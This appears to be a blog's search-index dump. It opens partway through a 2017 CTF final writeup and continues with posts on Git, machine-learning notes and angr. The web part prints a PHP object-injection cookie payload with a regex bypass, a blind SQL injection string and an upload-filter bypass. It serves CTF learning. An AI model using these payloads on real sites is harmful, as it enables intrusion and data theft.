最后就是读flag.php的内容了,这里可以通过反序列化去读,但是有两个过滤,一个是过滤了协议的使用,php://filter/convert.base64-encode/resource=flag.php就不能用了,因为不是严格的查找字符串所以./flag.php,后面还有一个对于你传入的序列化字符串有一个正则的过滤,PHP序列化字符串中对象长度前加一个+号仍可正常反序列化,可用此来绕过正则.将这个的序列化字符串作为cookie里面token的值提交得flag.   TextWall   进去随便提交了一个东西然后看到有一个lists的cookie,其中值为24c5889e00902d6bcc65073f0e91ea30bbe203c2 a:1:{i:0;s:9:”hiehiehie”;},字符串前一段为后一段序列化字符串的SHA1.一般构造反序列化一般都需要源码，所以找到了源码泄露点：http://textwall.bxsteam.xyz/.index.php.swo。   &lt;?php $lists = []; Class filelist{     public function __toString()     {         return highlight_file('hiehiehie.txt', true).highlight_file($this-&gt;source, true);     } } ........ ?&gt;   构造序列化的串（反序列化后是一个filelist类，$sorce值是我们想查找的路径，这样在反序列化后）这里我们构造如下:   $a = new filelist(); $b= new filelist(); $b-&gt;source = 'index.php'; $a-&gt;source=$b; $d=serialize($a); $e=sha1($d).$d; echo urlencode($e).\"&lt;br&gt;\";   得到16d8c3c46653e89932859dd7a2eb12fa59df777aO%3A8%3A%22filelist%22%3A1%3A%7Bs%3A6%3A%22source%22%3BO%3A8%3A%22filelist%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A9%3A%22index.php%22%3B%7D%7D作为cookie提交得到源码(贴部分):   233333333333333333333333333333333333333333333333333333333333333333 &lt;?php //flag in Fl4444444444g.php session_start(); $lists = []; Class filelist{     public $source;     public function __toString()   在上面的过程中将路径改为Fl4444444444g.php,读取即得到flag.   简单的盲注   这个题第一个hint是请关注图片,抓包发现是get请求发送图片对应的id来获取图片,这里id就是注入点,当id=1”的时候会报错,说明sql语句中使用的是”,接下来就是盲注密码,构造的为id=1”and ord(mid((password),1,1))&lt;48#,跑出来密码为8211d7b4ba2828919651,是DEDECMS的20位MD5加密,账号admin然后登陆进去一个上传文件的地方.  文件后缀是白名单过滤,我查了好久都没有结果,后来得知是phps后缀(不知道在哪里找的这种后缀…),然后还是传不上去是因为有关于PHP标识的过滤,改为比较不常见的脚本类型可以绕过。(开始时候我把language拼错了导致半天没过…)。   MOBILE   多谢款待   这题很坑，因为我android版本的原因，这个APK运行不了。而且很奇怪，是因为加保护了，还是其他原因，用Android_Killer无法反编译。无奈之下，用APKtools，对Main先转dex，再转java。直接看源码。。但是也很奇怪，这样转出来的string，都是十六进制的数字，不是ascii表示，也不是其他的。什么编码，卡在这里半天。。。后来学长指点说用Jeb可以看。于是我就去下载了。之后进行反编译。以下是伪Java代码。   private boolean check(String arg10, int arg11) {     int v0[] = new int[]{125, 108, 97, 103, 123, 51, 108, 51, 99, 116, 101, 57, 114, 65, 104, 99, 95, 99, 49, 114, 102};     //  数组的值是：}lag{3l3cte9rAhc_c1rf     int v2 = 0;     int v3 = 0;     char v5[]  = arg10.toCharArray();     if(arg10 != null &amp;&amp; arg11 != 0)     {         if(v5[0] == v0[arg10.length() - 1] &amp;&amp; v5[arg10.length() - 1] == v0[0])         {             v2 = 1;         }         int v1;         for(v1 = 1; v1 &lt; arg10.length() / 2; ++v1)         {             if(v5[v1] != v0[v1])             {                 break;             }             if(v1 == arg10.length() / 2 - 1)             {                 v3 = 1;             }         }         while(v1 &lt; arg10.length() - 1)         {             if(v5[v1] != v0[arg10.length() - v1])             {                 break;             }             ++v1;         }     } return v2 &amp; v3; }  public void onClick(View arg5) {     String v0 = this.editText.getText().toString().trim();     if(!this.check(v0, v0.length()))     {         Toast.makeText(((Context)this), \"It\\'s not smell good!\", 0).show();     }     else     {         Toast.makeText(((Context)this), \"Good, you got it!\", 0).show();     } }   为得到flag，只要check返回1就行，即在check中v2和v3都是1，发现check只是进行简单的替换，将最后一位和第一位替换。还原只要将}lag{3l3cte9rAhc_c1rf中第一位和最后一位对调即可，当然，长度相同也行，只要第一位是f，最后一位是}。这时候v2=1，而此时v3根据程序的推进必等于1，所以得到flag。   flag{3l3cte9rAhc_c1r}   助人为乐   这题，和第一题一样，我直接用Jeb分析了，Android_Killer同样失效了。程序的关键部分如下：    public static String encode(String password) {         int v11 = 6;         int v10 = 2;         if(password != null &amp;&amp; password.length() != 0) \t\t\t{             char[] pass = password.toCharArray();             StringBuilder v2 = new StringBuilder();             int i;             for(i = 0; i &lt; pass.length; ++i) {                 String v0;                 for(v0 = Integer.toBinaryString(pass[i]); v0.length() &lt; 8; v0 = \"0\" + v0) {                 }                  v2.append(v0);             }              while(v2.length() % 6 != 0) {                 v2.append(\"0\");             }              String v1 = String.valueOf(v2);             char[] v4 = new char[v1.length() / 6];             for(i = 0; i &lt; v4.length; ++i) {                 int v6 = Integer.parseInt(v1.substring(0, v11), v10);                 v1 = v1.substring(v11);                 v4[i] = Code.CodeText.charAt(v6);             }              StringBuilder v3 = new StringBuilder(String.valueOf(v4));             if(password.length() % 3 == 1) {                 v3.append(\"1\");             }             else if(password.length() % 3 == v10) {                 v3.append(\"23\");             }              for(i = 76; i &lt; v3.length(); i += 76) {                 v3.insert(i, \"\\r\\n\");             }              v3.append(\"\\r\\n\");             password = String.valueOf(v3);         }          return password;     }   这其中有两个列表，一个是加密列表：（长度为64=2^6）   abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#\\$%^&amp;*()+/   另一个是密文：   zMXHz$SXDf)SC@)UB$rFyv)Jmg@$zw^FyMfZzwnVzeuHFq1   本题就是要求我们解密出明文。加密过程大致如下：首先将输入的字符串对应的ascii码转换成二进制，每一字符是8bit，得到一串比特流。之后检测总长度是否为6的倍数，不是的话在后面补0，之后将比特流每6个一组，得到一串数字，数字均小于63(2^6-1)，将这串数字作为加密列表的下标查找对应字符，实现加密。 所以解法如下： 首先查找密文每一位在加密列表中的下标。   int main() {     char pass[] = \"zMXHz$SXDf)SC@)UB$rFyv)Jmg@$zw^FyMfZzwnVzeuHFq1\"; \tchar name[] = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&amp;*()+/\"; \tfor (int i = 0; i &lt; 47; i++) \t{ \t\tfor (int j = 0; j &lt; 65; j++) \t\t{ \t\t\tif (pass[i] == name[j]) \t\t\t{ \t\t\t\tcout &lt;&lt; j &lt;&lt; \" \"; \t\t\t\tbreak; \t\t\t} \t\t\telse \t\t\t\tcontinue; \t\t} \t } \treturn 0; }   得到的即为下标：   25 38 49 33 25 55 44 49 29 5 61 44 28 53 61 46 27 55 17 31 24 21 61 35 12 6 53 55 25 22 57 31 24 38 5 51 25 22 13 47 25 4 20 33 31 16   再转成二进制，注意补0对齐，6个一组。再去掉空格连起来。   011001 100110 110001 100001 011001 110111 101100 110001 011101 000101 111101 101100 011100 110101 111101 101110 011011 110111 010001 011111 011000 010101 111101 100011 001100 000110 110101 110111 011001 010110 111001 011111 011000 100110 000101 110011 011001 010110 001101 101111 011001 000100 010100 100001 011111 010000 -&gt;011001100110110001100001011001110111101100110001011101000101111101101100011100110101111101101110011011110111010001011111011000010101111101100011001100000110110101110111011001010110111001011111011000100110000101110011011001010110001101101111011001000100010100100001011111010000   之后再8个一组，作为字符，查ascii表。得到flag。   01100110 01101100 01100001 01100111 01111011 00110001 01110100 01011111 01101100 01110011 01011111 01101110 01101111 01110100 01011111 01100001 01011111 01100011 00110000 01101101 01110111 01100101 01101110 01011111 01100010 01100001 01110011 01100101 01100011 01101111 01100100 01000101 00100001 01111101 000 -&gt;flag{1t_ls_not_a_c0mwen_basecodE!}   REVERSE   reverse1   别想多了，这题就是看汇编。（哭） 第一步：首先判断输入字符串长度是否为0x1C。用ecx作为累加器，一次处理一个字节，累加和与1Ch作比较，相等则跳转。之后判断最后一位是否是}，是则call eax 进行下一步加密。   mov     al, [ecx] inc     ecx test    al, al jnz     short loc_401030 sub     ecx, edx cmp     ecx, 1Ch jz      short loc_40104B ………… cmp     [ebp+var_49], '}' jnz     short loc_401070 ………… lea     eax, [ebp+var_64] push    offset byte_403068 push    eax mov     eax, offset loc_403020 call    eax ; loc_403020   第二步：执行 call eax，之后，来到一段数据区，显然实际为代码，手动转成代码后，进行以下逻辑判断。即判断输入的前5个字符是否为flag{，是就进行call edx 下一轮加密。   cmp     byte ptr [eax], 'f' jnz     short loc_40305F cmp     byte ptr [eax+1], 'l' jnz     short loc_40305F cmp     byte ptr [eax+2], 'a' jnz     short loc_40305F cmp     byte ptr [eax+3], 'g' jnz     short loc_40305F cmp     byte ptr [eax+4], '{' jnz     short loc_40305F ………… push    offset unk_403110 push    eax call    edx   第三步：异或加密，注意到此时的基址指针ebp+8为输入的第6位的地址，而ebp-8是一个加密列表所在地址。通过赋值语句，和Intel小段结构，知道加密列表为 98 A4 A9 93。之后的运算表明，从输入的第6位开始和0xCC进行异或，再与加密的每一位依次对比，相等则继续，不等则退出，循环比较次数为4次。由于异或的可逆性，解除这段明文是：The_。最后取ebx+4则是取输入的第10位的地址进行下一轮加密。   mov     ebx, [ebp+8] lea     eax, [ebp-8] push    esi push    edi xor     edx, edx mov     dword ptr [ebp-8], 93A9A498h ………… lea     ecx, [ebp-8] add     ecx, esi mov     al, [edi+ecx] xor     al, 0CCh cmp     al, [ecx] jnz     short loc_4030B9 inc     esi cmp     esi, 4 jl      short loc_403088 ………… lea     eax, [ebx+4] push    offset unk_4032A0 push    eax call    ecx   第四步：Base64加密，首先进行初始化，初始加密列表为4部分：ABCD EFGHIJKLMNOPQRSTUVWXYZ abcdefghijklmnopqrstuvwxyz 0123456789 +/   mov     dl, 'A' xor     ecx, ecx mov     eax, ecx ………… mov     [ebp+eax-64h], dl inc     dl inc     eax cmp     dl, 'Z' jle     short loc_40311C mov     dl, 'a' ………… mov     [ebp+eax-64h], dl inc     dl inc     eax cmp     dl, 'z' jle     short loc_40312A mov     dl, '0' ………… mov     [ebp+eax-100], dl inc     dl inc     eax cmp     dl, '9' jle     short loc_403138 push    ebx push    esi push    edi mov     word ptr [ebp+eax-64h], '/+'   因为为避免明文泄露，肯定会有Base64加密后的密文出现，即cmVhbEN0Rl8=。之后会将输入的第10位开始的8位进行Base64加密，与该密文进行对比。由于开启了优化，这段代码是纯数学运算，因此跳过，直接解密密文后得到realCtF_。至此前17位已经得到：flag{The_realCtF_xxxxxxxxxx}。ebx+8为输入的第18位，eax取该地址后，再进行下一步加密。   mov     dword ptr [ebp-10h], 'hVmc' mov     dword ptr [ebp-0Ch], '0NEb' mov     dword ptr [ebp-8], '=8lR' ………… lea     eax, [ebx+8] push    eax call    ecx   第五步：首先进行加密列表的初始化，得到：kvtu`C4h”o。   mov     dword ptr [ebp-0Ch], 'utvk' push    esi push    edi mov     dword ptr [ebp-8], 'h4C`' or      edx, 0FFFFFFFFh mov     word ptr [ebp-4], 'o\"'   之后将输入值的第18位的地址传入esi中，esi+edi为加密列表的地址，即比较ecx与eax。并且ecx=加密列表每一个字符减一的值，eax=为输入第18位开始的值。循环比较10次，相等则继续，不等则退出。为得到明文，只要将密文6B 76 74 75 60 43 34 68 22 每一位都减一即可，得到6A 75 73 74 5F 42 33 67 21 ，即为：just_B3g!   movsx   ecx, byte ptr [edi+esi] movsx   eax, byte ptr [esi] dec     ecx cmp     eax, ecx jnz     short loc_4032EA inc     ebx inc     esi cmp     ebx, edx jl      short loc_4032D8   综上，得到flag{The_realCtF_just_B3g!n}。   PWN   我太菜了，完全不会啊。  ","categories": [],
        "tags": ["writeup"],
        "url": "https://zjgcjy.github.io/posts/2018-08/2017cumtctf%E5%86%B3%E8%B5%9B-writeup.html",
        "teaser":null},{
        "title": "Git_learning 1",
        "excerpt":"记录一下git的基础用法     基本配置   如果是本地新建git仓库，可以用git init，使某个文件夹被git所管理。   配置用户名和邮箱   git config --global user.name \"Your Name\" git config --global user.email \"email@example.com\"   配置ssh   ssh-keygen -t rsa -C \"youremail@example.com\"   配置gpg   如果要对每次的commit都进行认证，可以配置签名，首先生成gpg key   gpg --gen-key   然后查看GPG key：gpg --list-keys。再获取公钥：gpg --armor --export pub GPG key ID，导入到GitHub中。 本地的git配置就是先设置git签名时用的key：git config --global user.signingkey pub GPG key ID。然后设置全局都使用GPG签名：git config --global commit.gpgsign true     常用git命令   git status   查看当前版本中修改内容，如果发现不一致，可以用git diff file查看不同之处。   git add/rm   用于将新添加的文件/删除的文件和git联系起来，基本上每次commit之前都要add才行。   git commit   commit，提交版本，并用m参数加以说明message   $ git commit -m \"wrote a readme file\" [master (root-commit) eaadf4e] wrote a readme file  1 file changed, 2 insertions(+)  create mode 100644 readme.txt   git log   查看日志提交记录      如果输出信息太多，可以加上参数，每次输出一行   git log --pretty=oneline   git reset   git版本回溯，在Git中，用HEAD表示当前版本，也就是最新的提交1094adb上一个版本就是HEAD^，上上一个版本就是HEAD^^，当然往上100个版本写成HEAD~100。可以使用这个命令来进行版本后退。主要要添加-- hard参数，否则不起作用   $ git reset --hard HEAD^ HEAD is now at e475afc add distributed $ git reset --hard HEAD~1 HEAD is now at e475afc add distributed 或者指定id $git reset --hard commit_id   git reset命令既可以回退版本，也可以把暂存区的修改回退到工作区。当我们用HEAD时，表示最新的版本。例如   $ git reset HEAD readme.txt Unstaged changes after reset: M    readme.txt   git reflog   记录每一次commit记录，可以配合git reset来用，即如果回到之前版本，再会过去，可以查看commit记录来确定id，再git reset --hard commit_id即可。   $ git reflog e475afc HEAD@{1}: reset: moving to HEAD^ 1094adb (HEAD -&gt; master) HEAD@{2}: commit: append GPL e475afc HEAD@{3}: commit: add distributed eaadf4e HEAD@{4}: commit (initial): wrote a readme file   git checkout – file   checkout 文件可以丢弃工作区的修改。如果之前add过，可以回到add当时的状态；如果没有add过，可以回到当前版本的状态（未修改） 所以当是修改之后再git add的话，将无法回退，但是没有提交。这时可以用命令git reset HEAD &lt;file&gt;可以把暂存区的修改撤销掉（unstage）。 总结      文件没有git add，此时文件在工作区，直接用git checkout -- file可以恢复到上一个版本。   文件已经git add，此时文件在暂存区，但是没有提交，使用git reset HEAD file来抛弃暂存区的修改；此时文件修改只存在于工作区中，再次使用git checkout -- file就能恢复到上一个版本。   git checkout -- file还能来恢复被删除的文件，总之就是用版本库替换当前工作区。  ","categories": [],
        "tags": ["git"],
        "url": "https://zjgcjy.github.io/posts/2018-12/Git_Learning-1.html",
        "teaser":null},{
        "title": "Git_learning 2",
        "excerpt":"Git版本控制高级用法，包括分支管理等     分支管理   在git中，默认时间线是主分支，即master分支。HEAD严格来说不是指向提交，而是指向master，master才是指向提交的，所以，HEAD指向的就是当前分支。 一开始的时候，master分支是一条线，Git用master指向最新的提交，再用HEAD指向master，就能确定当前分支，以及当前分支的提交点：      当创建新的分支时，如dev，先将dev指向master，再将HEAD指向dev，所以一般对dev分支进行管理，然后再将master分支合并到dev分支，完成相应的功能。   创建分支   命令如下：   $ git checkout -b dev Switched to a new branch 'dev'   git checkout命令加上-b参数表示创建分支并切换，相当于以下两条命令：   $ git branch dev $ git checkout dev Switched to branch 'dev'   可以用git branch命令查看当前分支：   $ git branch * dev   master   合并分支   使用git merge命令来合并分支   $ git merge dev Updating d46f35e..b17d20e Fast-forward  readme.txt | 1 +  1 file changed, 1 insertion(+)   注意到上面的Fast-forward信息，这次合并是“快进模式”，也就是直接把master指向dev的当前提交，所以合并速度非常快。   删除分支   合并完成后，就可以删除dev分支了：   $ git branch -d dev Deleted branch dev (was b17d20e)   删除后，查看branch，就只剩master分支了：   $ git branch * master   总结      查看分支：git branch   创建分支：git branch &lt;name&gt;   切换分支：git checkout &lt;name&gt;   创建+切换分支：git checkout -b &lt;name&gt;   合并某分支到当前分支：git merge &lt;name&gt;   删除分支：git branch -d &lt;name&gt;   分支冲突   如果在dev分支上进行了修改，同时我们也在master上进行了修改，那么现在的时间线就会变成这样子：      对于这种情况，git无法进行快速合并，因为产生了冲突（某个文件）   $ git merge feature1 Auto-merging readme.txt CONFLICT (content): Merge conflict in readme.txt Automatic merge failed; fix conflicts and then commit the result.   git status也可以告诉我们冲突的文件，也可以直接查看readme.txt的内容：   Git is a distributed version control system. Git is free software distributed under the GPL. Git has a mutable index called stage. Git tracks changes of files. &lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD Creating a new branch is quick &amp; simple. ======= Creating a new branch is quick AND simple. &gt;&gt;&gt;&gt;&gt;&gt;&gt; feature1   其中，git用&lt;&lt;&lt;&lt;&lt;&lt;&lt;，=======，&gt;&gt;&gt;&gt;&gt;&gt;&gt;标记出不同分支的内容，我们修改如下后保存：   $ git add readme.txt $ git commit -m \"conflict fixed\" [master cf810e4] conflict fixed   现在，master分支和feature1分支变成了下图所示：      用带参数的git log也能看到分支合并情况：   $ git log --graph --pretty=oneline --abbrev-commit *   cf810e4 (HEAD -&gt; master) conflict fixed |\\   | * 14096d0 (feature1) AND simple * | 5dc6824 &amp; simple |/   * b17d20e branch test * d46f35e (origin/master) remove test.txt * b84166e add test.txt * 519219b git tracks changes * e43a48b understand how stage works * 1094adb append GPL * e475afc add distributed * eaadf4e wrote a readme file   分支合并后，可以使用git branch -d &lt;name&gt;来删除分支。 解决冲突就是手动编辑Git合并失败的文件，再提交。用git log --graph命令可以看到分支合并图。   分支管理策略   这里要说明几点问题，首先，git默认会使用fast forward模式，但这种模式下，合并分支会丢失信息，如果不使用这个模式，将在合并的时候重新建立一个commit，这样能看到分支的信息。 关闭fast forward模式，进行合并，使用--no-ff参数来git merge，这里准备合并dev分支，请注意--no-ff参数，表示禁用Fast forward：   $ git merge --no-ff -m \"merge with no-ff\" dev Merge made by the 'recursive' strategy.  readme.txt | 1 +  1 file changed, 1 insertion(+)   因为本次合并要创建一个新的commit，所以加上-m参数，把commit描述写进去。合并后，用git log看看分支历史：   $ git log --graph --pretty=oneline --abbrev-commit *   e1e9c68 (HEAD -&gt; master) merge with no-ff |\\   | * f52c633 (dev) add merge |/   *   cf810e4 conflict fixed   可以看到，不使用Fast forward模式，merge后就像这样：      git stash 命令   这个命令保存工作区，等以后恢复现场后继续工作：   $ git stash Saved working directory and index state WIP on dev: f52c633 add merge   恢复的时候，先用git stash list命令查看状态：   $ git stash list stash@{0}: WIP on dev: f52c633 add merge   工作现场还在，Git把stash内容存在某个地方了，但是需要恢复一下。一是用git stash apply stash@{id}恢复，但是恢复后，stash内容并不删除，你需要用git stash drop来删除。另一种方式是用git stash pop，恢复的同时把stash内容也删了：   $ git stash pop On branch dev Changes to be committed:   (use \"git reset HEAD &lt;file&gt;...\" to unstage)      new file:   hello.py  Changes not staged for commit:   (use \"git add &lt;file&gt;...\" to update what will be committed)   (use \"git checkout -- &lt;file&gt;...\" to discard changes in working directory)      modified:   readme.txt  Dropped refs/stash@{0} (5d677e2ee266f39ea296182fb2354265b91b3b2a)   git rebase   $ git rebase First, rewinding head to replay your work on top of it... Applying: add comment Using index info to reconstruct a base tree... M    hello.py Falling back to patching base and 3-way merge... Auto-merging hello.py Applying: add author Using index info to reconstruct a base tree... M    hello.py Falling back to patching base and 3-way merge... Auto-merging hello.py      rebase操作可以把本地未push的分叉提交历史整理成直线；   rebase的目的是使得我们在查看历史提交的变化时更容易，因为分叉的提交需要三方对比。  ","categories": [],
        "tags": ["git"],
        "url": "https://zjgcjy.github.io/posts/2018-12/Git_Learning-2.html",
        "teaser":null},{
        "title": "Git_learning 3",
        "excerpt":"Git版本控制高级用法，包括标签管理，其他进阶内容没有涉及。     标签管理   在git中打标签很简单， 先切换到一个分支上，然后用git tag name即可，同时可以用git tag查看所有标签。   $ git tag v1.0  $ git tag v1.0   上面这样标签是对最新的commit来说的，如果要对某个commit来标签，可以用git tag v0.9 commit_id，还可以创建带有说明的标签，用-a指定标签名，-m指定说明文字，例如   $git tag -a v0.1 -m \"version 0.1 released\" 1094adb   注意：标签总是和某个commit挂钩。如果这个commit既出现在master分支，又出现在dev分支，那么在这两个分支上都可以看到这个标签。   如果标签打错了，也可以删除：   $ git tag -d v0.1 Deleted tag 'v0.1' (was f15b0dd)   如果要推送某个标签到远程，使用命令git push origin &lt;tagname&gt;：   $ git push origin v1.0 Total 0 (delta 0), reused 0 (delta 0) To github.com:michaelliao/learngit.git  * [new tag]         v1.0 -&gt; v1.0    或者，一次性推送全部尚未推送到远程的本地标签：   $ git push origin --tags Total 0 (delta 0), reused 0 (delta 0) To github.com:michaelliao/learngit.git  * [new tag]         v0.9 -&gt; v0.9   如果标签已经推送到远程，要删除远程标签就麻烦一点，先从本地删除：   $ git tag -d v0.9 Deleted tag 'v0.9' (was f52c633)   然后，从远程删除。删除命令也是push，但是格式如下：   $ git push origin :refs/tags/v0.9 To github.com:michaelliao/learngit.git  - [deleted]         v0.9  ","categories": [],
        "tags": ["git"],
        "url": "https://zjgcjy.github.io/posts/2018-12/Git_Learning-3.html",
        "teaser":null},{
        "title": "Machine_learning 1",
        "excerpt":"开始学习机器学习，记录下第一周的笔记，希望自己能坚持吧。     机器学习定义   这里给出了2种机器学习的定义：   Arthur Samuel described it as: \"the field of study that gives computers the ability to learn without being explicitly programmed.\" This is an older, informal definition.  Tom Mitchell provides a more modern definition: \"A computer program is said to learn from experience E with respect to some class of tasks T and performance measure P, if its performance at tasks in T, as measured by P, improves with experience E.\"  Example: playing checkers. E = the experience of playing many games of checkers T = the task of playing checkers. P = the probability that the program will win the next game.   大体上，任何机器学习问题都额能分成2种类型，一种是是监督学习，一种是非监督学习。   监督学习   在监督学习中，对于数据中的每个数据，都有相应的正确答案（训练集），而监督学习就是基于这些数据进行预测。那么这里介绍了2中监督学习的方法，分别是回归问题和分类问题。   回归问题   回归问题是对于连续的问题来说的，基于训练集进行预测，训练集都是有正确答案的。      分类问题   那么分类问题就是对离散的问题来说的，对离散的问题进行预测。         这里给2个例子，区分一下。   **Example 1:**  Given data about the size of houses on the real estate market, try to predict their price. Price as a function of size is a continuous output, so this is a regression problem.  We could turn this example into a classification problem by instead making our output about whether the house \"sells for more or less than the asking price.\" Here we are classifying the houses based on price into two discrete categories.  **Example 2**:  (a) Regression - Given a picture of a person, we have to predict their age on the basis of the given picture  (b) Classification - Given a patient with a tumor, we have to predict whether the tumor is malignant or benign.   无监督学习   不同于监督学习，无监督学习的样本都是未知的，没有属性或者标签，即没有正确答案的，所有样本都是一样的，无区别的，如图所示。那么无监督学习也分为2种，一种是聚类算法，还有是鸡尾酒宴席问题。         聚类算法   所谓聚类算法，就是在不知道数据集的分组情况下，对数据集进行分组，比如聚合相同的新闻，聚合相同兴趣的人（物以类聚，人以群分）。      鸡尾酒宴席问题（分散算法）   同样是对数据集进行分组，或者说是分离，这里只显示了2个输入的情况，如果输入源更多，情况会复杂很多。      下面给出这两个问题的描述。   **Example:**  Clustering: Take a collection of 1,000,000 different genes, and find a way to automatically group these genes into groups that are somehow similar or related by different variables, such as lifespan, location, roles, and so on.  Non-clustering: The \"Cocktail Party Algorithm\", allows you to find structure in a chaotic environment. (i.e. identifying individual voices and music from a mesh of sounds at a)   模型展示   监督学习中的模型表示，这里用的是线性回归模型。用x表示输入数据，y表示输出数据，建立模型就是要建立x和y之间的联系，这里用h(x)来表示，因为h(x)的定义是线性的函数，所以称为线性回归模型。 我们的目标就是建立有效的函数映射，使得，当X → Y，h(x)能很好的对y的值进行预测。      线性回归模型能应用于监督学习的2种类别，即回归和分类，它都非常有效。   代价函数   先给出代价函数的定义。     这里的hx指的是估计函数，也就是最后要拟合的曲线，我们的目标就是要找到最适合的估计函数hx，反应到J中，就是要找到代价函数最小值对应的参数值。也就是通过代价函数来测量估计函数的拟合程度。      代价函数在概率论中也称为均方差或者平方差，反应了数据整体的分布情况。      可视化代价函数   为了将代价函数可视化，这里先选择过原点的估计函数，要注意的是估计函数是关于x的函数，而代价函数是关于参数Θ的函数。那么我们可以固定Θ的值，来画出hx，再根据hx得到估计函数J的图像，如下所示：      注意到，我们的目标是获得代价函数的最小值，很容易看到，当估计函数比较简单的时候，当我们选取通过所有样本的函数时，此时代价函数的值最小，为0，说明此时估计函数完美的估计了所有的样本，是最佳的情况。   但是上述只是最简单的情况，对于一般的情形来说，难以用二维的图像来说明。这里视频中使用了轮廓图的概念，如下图所示，通过横轴和纵轴的2个参数来整体反应代价函数的变化情况，和地理上的等高线差不多，同一条线上的代价函数值相同。         梯度下降算法 (Gradient Descent)   梯度下降算法，可以将代价函数J最小化，公式如下。其中的α表示学习速率，即步长，理解为每次走的距离，还要注意的是，这个公式是对Θ0和Θ1同时进行的，也就是二者应该同步，不能先算一方向，然后更新，应该同时进行。此处的偏导数对应该点在x方向和y方向分别对应的梯度，这样是下降最快的方式，用以求解到局部最优解。        梯度下降算法还需要注意的一点是，该算法需要指定初始化点，对于距离很近的点来说，也可能得到不同的局部最优解（类似蝴蝶效应）如下图所示。      关于参数a，需要指出的有2点。      1.α选取要适当，过小，每次移动的距离会很小，耗时较多。；过大，每次移动的距离会很大，有可能会导致不能收敛到局部最优的情况。         2.当α固定时，改算法能正确找到局部最优解，原因是随着斜率的缩小，在α不变的情况下，每次Θi减少的距离也缩小了，这样能保证收敛到局部最优的情况，当其已经在具备最优的情况下时，斜率为0，将不再变化，即得到结果。      应用于线性回归的梯度下降算法(Gradient Descent For Linear Regression)   那么这时候，对于线性回归模型，我们有hx和J，对于J，我们可以使用梯度下降算法来计算每一步的最优解，如下图所示。      那么对于J的2个参数来说，我们根据梯度下降算法，分别对J中的2个变量求J的偏导数，就能得到每个方向上的梯度下降的最优解，这样得到下面2个方程。      这样就能对两个变量进行更新，同时得到的就是局部最优解，同时根据具备最优解是全局最优解这个前提，得到全局最优解。   矩阵和向量   这里都是现代里面的知识了，我就不多说了，基本都会。   Week 1 ends here.  ","categories": [],
        "tags": ["ml"],
        "url": "https://zjgcjy.github.io/posts/2018-12/Machine_Learning-1.html",
        "teaser":null},{
        "title": "Machine_learning 2",
        "excerpt":"机器学习笔记week2。fighting。     多变量线性回归   假设现在有n个变量影响最终的结果，我们可以这样设立方程，注意变量均是线性的。其中θ是参量，而x是变量。     我们也可以将上述表达式写成矩阵相乘的形式，如下图所示。      即    多变量代价函数和梯度函数   然后我们就能得到估计函数，参数，代价函数的表达式，如下图所示，并且我们将关于θ的参数看成一个整体，作为θ的行向量，然后我们定义梯度下降函数的表达式，即对代价函数中每个变量求偏导数。    如下图所示，我们可以对比单变量和多变量的情况，其实类似，由于我们定义了初始值是1，所以所有变量的情况和单变量情况下保持一致。      公式如下所示。     特征缩放   进行特征缩放的意义就是在于，如果多变量之间的差距较大，在进行梯度下降的过程中，我们进行梯度下降的时间会比较慢，次数也比较多，如下图所示。      我们将每个变量进行缩放，将其缩放到区间-1到1之间，是比较好的情况。   均值归一化      如上图所示，我们可以使用变量进行替换。具体方式减去变量的平均值再除以范围（标准差），就能得到一个很好的范围来进行梯度下降。   关于学习比例α   如何确定α的值是比较困难的，这里视频中提出了一种方法，即画出每一次迭代和代价函数的相应值，用以检测每一次迭代是否正确。如下图所示。同时我们可以选定一个极小值，如果在一次迭代中代价函数的值减小的部分小于极小值，可以认为代价函数已经根据梯度下降算法找到了最小值。      如果代价函数随着迭代次数不是逐渐下降的，那我们可以认为α的值设定错误，大多数情况下都是偏大了，如下图所示，这些情况的原因都是α偏大，所以画出图像是一个很好的检测方式来判断α的值是否恰当。      多项式线性回归   讨论如何拟合多项式，一般的方式是通过换元法，即将变量替代成高次，同时注意控制变量的范围，这里需要和之前特征缩放结合起来，使得变量之间差距不要过大。      正规方程   正规方程能给出一个标准解法来求解代价函数的最小值，图解如下所示。当你有m个数据，每个数据n个特征值时，根据如下的解法，我们能得到最小值。      即     梯度下降和正规方程的比较                  梯度下降       正规方程                       需要选择α       不需要α                 需要很多次迭代       不需要迭代                 运算复杂度是n的平方       运算复杂度是n的立方，且需要计算逆矩阵                 当n很大时，仍然有效       当n很大时，速度很慢           关于矩阵不可逆   如果碰到矩阵不可逆的情况，一般有2种方式来解决这个问题，首先是检测是否存在多余的特征变量，即多个变量之间线性相关，这会导致这个问题。其次检测是否特征变量太多，可以选择删除某些变量，或者使用正规化来解决这个问题。   Week 2 ends here.  ","categories": [],
        "tags": ["ml"],
        "url": "https://zjgcjy.github.io/posts/2018-12/Machine_Learning-2.html",
        "teaser":null},{
        "title": "Machine_learning 3",
        "excerpt":"机器学习笔记week3。keep fighting。     暂停   和大佬聊了一波，先暂停这部分工作。毕业前重点还是放在re和pwn上面。  ","categories": [],
        "tags": ["ml"],
        "url": "https://zjgcjy.github.io/posts/2018-12/Machine_Learning-3.html",
        "teaser":null},{
        "title": "Angrlearning 1",
        "excerpt":"   学习笔记，结合官方文档和网上资料整理，加强理解 从angr官方文档的第二章核心概念开始。      顶层接口   学习一些基本的顶层接口，对angr的概念和对象有个整体的把握。使用angr的第一步总是创建一个angr工程去加载一个文件。 工程是你控制angr的基础，有了它，你就能进行分析和模拟刚刚加载的文件。几乎在angr中碰到的所有单个对象在某种形式上都取决于工程的存在。    基础特性   通过Project对象，我们可以获取程序的基础特性，包括CPU架构、文件名、入口点、大小端序、字长等等的信息。      可以看到，Project的特性有很多，其中比较常用的是：arch、analyses、loader、entry、factory、filename、hook等。其中arch是archinfo.Arch的对象，显示了文件的架构，是AMD64。proj.arch.memory_endness则显示了（LE），即小段序。arch.bits代表的是机器的字长位数，即64位物理机。arch.bytes代表了系统的数据长度单位是8byte。entry是执行文件的入口点，filename是文件名。   加载器（Loader）   从二进制文件中得到运行时的虚拟地址空间是非常复杂的。angr通过CLE模块来加载不同架构的程序，从而分析，其结果可以通过Project的.loader特性中获得。 我们可以通过它来观察共享库的加载情况和对加载地址空间进行基本的数据查询。      In [21]: proj.loader Out[21]: &lt;Loaded su_pwn100, maps [0x8048000:0xd008000]&gt; # 查看最小地址 In [23]: proj.loader.min_addr Out[23]: 0x8048000 # 查看最大地址 In [24]: proj.loader.max_addr 